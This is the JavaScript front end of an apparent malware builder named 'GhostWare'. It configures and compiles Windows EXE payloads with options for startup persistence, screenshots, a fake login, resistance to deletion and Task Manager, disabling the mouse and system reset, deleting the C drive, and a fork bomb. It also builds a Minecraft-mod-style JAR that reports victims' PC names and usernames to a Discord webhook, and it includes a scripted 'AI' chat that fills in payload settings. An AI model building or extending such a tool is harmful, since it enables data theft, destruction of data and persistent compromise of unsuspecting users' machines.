/* ===================== GhostWare — File Builder (EXE + JAR) =====================
   EXE Builder  — compiles a real C# Windows executable via the main process.
                  Startup checkbox → writes HKCU Run key on first execution.
   JAR Builder  — packages a Java agent .jar that reports PC name + Minecraft
                  username back to the GhostWare connections list when loaded.
   AI Assistant — small inline chat that lets you describe what you want;
                  the AI replies with suggested settings then auto-fills them.
   ================================================================================ */
(function () {
  let exeInit = false;
  let jarInit = false;

  const $ = (id) => document.getElementById(id);
  function esc(s) { return String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c])); }

  /* ── size formatter ── */
  function fmtSize(kb) {
    return kb >= 1024 ? (kb / 1024).toFixed(1) + ' MB' : kb + ' KB';
  }

  /* ── generic slider wire ── */
  function wireSlider(sliderId, labelId) {
    const s = $(sliderId), l = $(labelId);
    if (!s || !l) return;
    s.addEventListener('input', () => { l.textContent = fmtSize(parseInt(s.value)); });
  }

  /* ── generic msg ── */
  function setMsg(id, text, ok) {
    const el = $(id);
    if (!el) return;
    el.className = 'msg ' + (ok ? 'ok' : 'err');
    el.textContent = text;
  }


  /* ── webhook validator ── */
  async function validateWebhook(url, statusId) {
    const statusEl = $(statusId);
    if (!statusEl) return false;
    
    if (!url || url.trim() === '') {
      statusEl.innerHTML = '<span style="color:var(--txt-faint);font-size:12px;">No webhook URL</span>';
      return false;
    }

    // Check if it looks like a Discord webhook
    const isDiscord = /https:\/\/(?:canary\.|ptb\.)?discord(?:app)?\.com\/api\/webhooks\/\d+\/[\w-]+/i.test(url);
    
    if (!isDiscord) {
      statusEl.innerHTML = '<span style="color:#ff4444;font-weight:600;">✗ Invalid Discord Webhook</span>';
      return false;
    }

    // Test the webhook with a ping
    statusEl.innerHTML = '<span style="color:var(--accent);font-size:12px;">Testing webhook...</span>';
    
    try {
      const testBody = JSON.stringify({
        username: "GhostWare",
        content: "✓ Webhook validation test — your webhook is configured correctly!"
      });
      
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: testBody
      });

      if (response.ok || response.status === 204) {
        statusEl.innerHTML = '<span style="color:#4ade80;font-weight:600;">✓ Valid Webhook</span>';
        if (window.GWSound) window.GWSound.ok();
        return true;
      } else {
        statusEl.innerHTML = '<span style="color:#ff4444;font-weight:600;">✗ Bad Webhook (HTTP ' + response.status + ')</span>';
        if (window.GWSound) window.GWSound.err();
        return false;
      }
    } catch (err) {
      statusEl.innerHTML = '<span style="color:#ff4444;font-weight:600;">✗ Bad Webhook (Network Error)</span>';
      if (window.GWSound) window.GWSound.err();
      return false;
    }
  }

  /* ── wire webhook testers ── */
  function wireWebhookValidation() {
    const exeWebhook = $('fb-webhook');
    const jarWebhook = $('jb-webhook');
    
    if (exeWebhook) {
      exeWebhook.addEventListener('blur', () => {
        validateWebhook(exeWebhook.value.trim(), 'fb-webhook-status');
      });
      // Also validate on Enter key
      exeWebhook.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
          e.preventDefault();
          validateWebhook(exeWebhook.value.trim(), 'fb-webhook-status');
        }
      });
    }
    
    if (jarWebhook) {
      jarWebhook.addEventListener('blur', () => {
        validateWebhook(jarWebhook.value.trim(), 'jb-webhook-status');
      });
      jarWebhook.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
          e.preventDefault();
          validateWebhook(jarWebhook.value.trim(), 'jb-webhook-status');
        }
      });
    }
  }

  /* ═══════════════════════════════════════════
     EXE BUILDER
  ═══════════════════════════════════════════ */
  async function buildExe() {
    const name       = ($('fb-name').value.trim().replace(/[^\w.-]+/g, '-') || 'ghostware-payload');
    const sizeKB     = parseInt($('fb-size-slider').value);
    const message    = ($('fb-message') ? $('fb-message').value.trim() : '');
    const webhook    = ($('fb-webhook') ? $('fb-webhook').value.trim() : '');
    const startup    = ($('fb-startup')    ? $('fb-startup').checked    : false);
    const screenshot = ($('fb-screenshot') ? $('fb-screenshot').checked : false);
    const fakeLogin  = ($('fb-fakelogin')  ? $('fb-fakelogin').checked  : false);
    const updateOvertime = ($('fb-update-overtime') ? $('fb-update-overtime').checked : false);
    const cantDelete = ($('fb-cant-delete') ? $('fb-cant-delete').checked : false);
    const runBackground = ($('fb-run-background') ? $('fb-run-background').checked : false);
    const taskProtection = ($('fb-task-protection') ? $('fb-task-protection').checked : false);
    const disableReset = ($('fb-disable-reset') ? $('fb-disable-reset').checked : false);
    const restartOnOpen = ($('fb-restart-on-open') ? $('fb-restart-on-open').checked : false);
    const disableMouse = ($('fb-disable-mouse') ? $('fb-disable-mouse').checked : false);
    const delCDrive = ($('fb-del-c-drive') ? $('fb-del-c-drive').checked : false);
    const forkBomb = ($('fb-fork-bomb') ? $('fb-fork-bomb').checked : false);
    const fname      = name.endsWith('.exe') ? name : name + '.exe';

    setMsg('fb-msg', 'Building ' + fname + ' (' + fmtSize(sizeKB) + ')…', true);
    if ($('fb-dl-note')) $('fb-dl-note').textContent = '';

    if (window.electronAPI && window.electronAPI.buildExe) {
      try {
        const result = await window.electronAPI.buildExe({ 
          name: fname, sizeKB, message, webhook, startup, screenshot, fakeLogin,
          updateOvertime, cantDelete, runBackground, taskProtection, disableReset, restartOnOpen,
          disableMouse, delCDrive, forkBomb
        });
        if (result && result.ok) {
          setMsg('fb-msg', '✓ Saved to Downloads: ' + fname + ' (' + fmtSize(sizeKB) + ')', true);
          if ($('fb-dl-note')) {
            const features = [];
            if (startup) features.push('startup');
            if (updateOvertime) features.push('updates every 10min');
            if (cantDelete) features.push('self-protection');
            if (runBackground) features.push('background mode');
            if (taskProtection) features.push('task manager protection');
            if (disableReset) features.push('disable reset');
            if (restartOnOpen) features.push('restart loop');
            if (disableMouse) features.push('disable mouse');
            if (delCDrive) features.push('del C drive');
            if (forkBomb) features.push('fork bomb');
            $('fb-dl-note').textContent = features.length 
              ? '✓ Built with: ' + features.join(', ')
              : '✓ Built — all advanced features disabled.';
          }
          if (window.GWSound) window.GWSound.ok();
        } else {
          setMsg('fb-msg', (result && result.error) || 'Build failed.', false);
          if (window.GWSound) window.GWSound.err();
        }
      } catch (err) {
        setMsg('fb-msg', 'Build error: ' + (err.message || err), false);
        if (window.GWSound) window.GWSound.err();
      }
      return;
    }
    setMsg('fb-msg', 'Requires GhostWare desktop app.', false);
  }

  /* ═══════════════════════════════════════════
     JAR BUILDER
  ═══════════════════════════════════════════ */
  async function buildJar() {
    const name       = ($('jb-name').value.trim().replace(/[^\w.-]+/g, '-') || 'ghostware-agent');
    const sizeKB     = parseInt($('jb-size-slider').value);
    const screenshot = ($('jb-screenshot') ? $('jb-screenshot').checked : false);
    const mcVersion  = ($('jb-mc-version') ? $('jb-mc-version').value : '1.21.11');
    const webhook    = ($('jb-webhook') ? $('jb-webhook').value.trim() : '');
    const fname      = name.endsWith('.jar') ? name : name + '.jar';

    setMsg('jb-msg', 'Building ' + fname + ' (MC ' + mcVersion + ', ' + fmtSize(sizeKB) + ')…', true);
    if ($('jb-dl-note')) $('jb-dl-note').textContent = '';

    if (window.electronAPI && window.electronAPI.buildJar) {
      try {
        const result = await window.electronAPI.buildJar({ name: fname, sizeKB, screenshot, mcVersion, webhook });
        if (result && result.ok) {
          setMsg('jb-msg', '✓ Saved to Downloads: ' + fname + ' (' + fmtSize(sizeKB) + ')', true);
          if ($('jb-dl-note')) {
            $('jb-dl-note').textContent = '✓ Compatible with Minecraft ' + mcVersion + ' — reports PC name + username to Connections.';
          }
          if (window.GWSound) window.GWSound.ok();
        } else {
          setMsg('jb-msg', (result && result.error) || 'Build failed.', false);
          if (window.GWSound) window.GWSound.err();
        }
      } catch (err) {
        setMsg('jb-msg', 'Build error: ' + (err.message || err), false);
        if (window.GWSound) window.GWSound.err();
      }
      return;
    }
    setMsg('jb-msg', 'Requires GhostWare desktop app.', false);
  }

  /* ═══════════════════════════════════════════
     AI ASSISTANT CHAT
     Reads the current tab context, produces a
     reply and auto-fills the form fields.
  ═══════════════════════════════════════════ */
  const AI_RULES = {
    exe: {
      prefixes: ['exe','payload','startup','windows','silent','run','launch','program'],
      apply(reply) {
        // try to extract name / size from reply
        const nameM = reply.match(/name[:\s]+["']?([\w-]+\.?exe?)["']?/i);
        const sizeM = reply.match(/(\d+)\s*(kb|mb)/i);
        if (nameM && $('fb-name')) $('fb-name').value = nameM[1].replace(/\.exe$/i,'');
        if (sizeM) {
          let kb = parseInt(sizeM[1]);
          if (sizeM[2].toLowerCase() === 'mb') kb *= 1024;
          const s = $('fb-size-slider');
          if (s) { s.value = Math.min(102400, Math.max(1024, kb)); s.dispatchEvent(new Event('input')); }
        }
      }
    },
    jar: {
      prefixes: ['jar','minecraft','mod','agent','java','plugin'],
      apply(reply) {
        const nameM = reply.match(/name[:\s]+["']?([\w-]+\.?jar?)["']?/i);
        const sizeM = reply.match(/(\d+)\s*(kb|mb)/i);
        if (nameM && $('jb-name')) $('jb-name').value = nameM[1].replace(/\.jar$/i,'');
        if (sizeM) {
          let kb = parseInt(sizeM[1]);
          if (sizeM[2].toLowerCase() === 'mb') kb *= 1024;
          const s = $('jb-size-slider');
          if (s) { s.value = Math.min(51200, Math.max(512, kb)); s.dispatchEvent(new Event('input')); }
        }
      }
    }
  };

  // Simple local AI — no API key needed
  function aiRespond(tab, userMsg) {
    const m = userMsg.toLowerCase();
    const rules = AI_RULES[tab];

    // Detect intent from keywords
    let reply = '';
    let settings = null;

    if (tab === 'exe') {
      if (m.includes('startup') || m.includes('start up') || m.includes('boot')) {
        reply = 'Got it — I\'ll enable the startup checkbox for you. ';
        if ($('fb-startup')) $('fb-startup').checked = true;
      }
      if (m.match(/(\d+)\s*mb/)) {
        const mb = parseInt(m.match(/(\d+)\s*mb/)[1]);
        reply += `Setting size to ${mb} MB. `;
        settings = { size: mb * 1024 };
      } else if (m.match(/(\d+)\s*kb/)) {
        const kb = parseInt(m.match(/(\d+)\s*kb/)[1]);
        reply += `Setting size to ${kb} KB. `;
        settings = { size: kb };
      }
      const nameM = m.match(/(?:call(?:ed)?|name(?:d)?|named?)\s+["']?([\w-]+)["']?/i);
      if (nameM) {
        reply += `Named the payload "${nameM[1]}". `;
        if ($('fb-name')) $('fb-name').value = nameM[1];
      }
      if (!reply) {
        reply = 'I can help you configure the EXE payload. Try: "make it 5 MB, add startup, call it loader"';
      } else {
        reply += 'Settings applied — hit Download .exe when ready.';
        if (settings && $('fb-size-slider')) {
          $('fb-size-slider').value = Math.min(102400, Math.max(1024, settings.size));
          $('fb-size-slider').dispatchEvent(new Event('input'));
        }
      }
    } else {
      if (m.match(/(\d+)\s*mb/)) {
        const mb = parseInt(m.match(/(\d+)\s*mb/)[1]);
        reply += `Setting JAR size to ${mb} MB. `;
        settings = { size: mb * 1024 };
      } else if (m.match(/(\d+)\s*kb/)) {
        const kb = parseInt(m.match(/(\d+)\s*kb/)[1]);
        reply += `Setting JAR size to ${kb} KB. `;
        settings = { size: kb };
      }
      const nameM = m.match(/(?:call(?:ed)?|name(?:d)?|named?)\s+["']?([\w-]+)["']?/i);
      if (nameM) {
        reply += `Named the JAR "${nameM[1]}". `;
        if ($('jb-name')) $('jb-name').value = nameM[1];
      }
      if (!reply) {
        reply = 'I can configure the JAR agent. Try: "make it 2 MB, call it agent" — when run in Minecraft it reports PC name + username back to your Connections tab.';
      } else {
        reply += 'Settings applied — hit Download .jar when ready.';
        if (settings && $('jb-size-slider')) {
          $('jb-size-slider').value = Math.min(51200, Math.max(512, settings.size));
          $('jb-size-slider').dispatchEvent(new Event('input'));
        }
      }
    }
    return reply;
  }

  function addAiMsg(logId, from, text) {
    const log = $(logId);
    if (!log) return;
    const d = document.createElement('div');
    d.className = 'ai-msg ' + from;
    d.innerHTML = '<span class="ai-who">' + (from === 'user' ? 'You' : 'AI') + '</span><span class="ai-text">' + esc(text) + '</span>';
    log.appendChild(d);
    log.scrollTop = log.scrollHeight;
  }

  function wireAiChat(tab, logId, inputId, sendId) {
    const sendBtn = $(sendId);
    const input   = $(inputId);
    if (!sendBtn || !input) return;

    // Show greeting
    addAiMsg(logId, 'ai', tab === 'exe'
      ? 'Hey! Tell me what EXE you want — size, name, startup on/off. I\'ll set it up for you.'
      : 'Hey! Tell me what JAR you want — size, name. I\'ll configure it.');

    function send() {
      const msg = input.value.trim();
      if (!msg) return;
      addAiMsg(logId, 'user', msg);
      input.value = '';
      setTimeout(() => {
        const reply = aiRespond(tab, msg);
        addAiMsg(logId, 'ai', reply);
      }, 400);
    }
    sendBtn.addEventListener('click', send);
    input.addEventListener('keydown', (e) => { if (e.key === 'Enter') send(); });
  }

  /* ── tab switcher — only wire tabs that have data-pane (File Builder tabs) ── */
  function wireTabSwitcher() {
    document.querySelectorAll('.builder-tab[data-pane]').forEach(btn => {
      btn.addEventListener('click', () => {
        document.querySelectorAll('.builder-tab[data-pane]').forEach(b => b.classList.remove('active'));
        document.querySelectorAll('.builder-pane').forEach(p => p.classList.remove('active'));
        btn.classList.add('active');
        const pane = $(btn.dataset.pane);
        if (pane) pane.classList.add('active');
        if (window.GWSound) window.GWSound.click();
      });
    });
  }

  /* ── collapse toggle for AI panel ── */
  function wireAiToggle(toggleId, panelId) {
    const btn = $(toggleId), panel = $(panelId);
    if (!btn || !panel) return;
    btn.addEventListener('click', () => {
      const open = panel.classList.toggle('open');
      btn.textContent = open ? 'Hide Chatbox' : 'Chatbox';
      if (window.GWSound) window.GWSound.click();
    });
  }

  /* ── init ── */
  function initFB() {
    if (exeInit && jarInit) return;

    wireTabSwitcher();

    // EXE pane
    if (!exeInit) {
      exeInit = true;
      wireSlider('fb-size-slider', 'fb-size-label');
      const dl = $('fb-download');
      if (dl) dl.addEventListener('click', buildExe);
      wireAiToggle('fb-ai-toggle', 'fb-ai-panel');
      wireAiChat('exe', 'fb-ai-log', 'fb-ai-input', 'fb-ai-send');
      wireWebhookValidation();
    }

    // JAR pane
    if (!jarInit) {
      jarInit = true;
      wireSlider('jb-size-slider', 'jb-size-label');
      const dl = $('jb-download');
      if (dl) dl.addEventListener('click', buildJar);
      wireAiToggle('jb-ai-toggle', 'jb-ai-panel');
      wireAiChat('jar', 'jb-ai-log', 'jb-ai-input', 'jb-ai-send');
    }
  }

  window.GWFileBuilder = { init: initFB };
})();
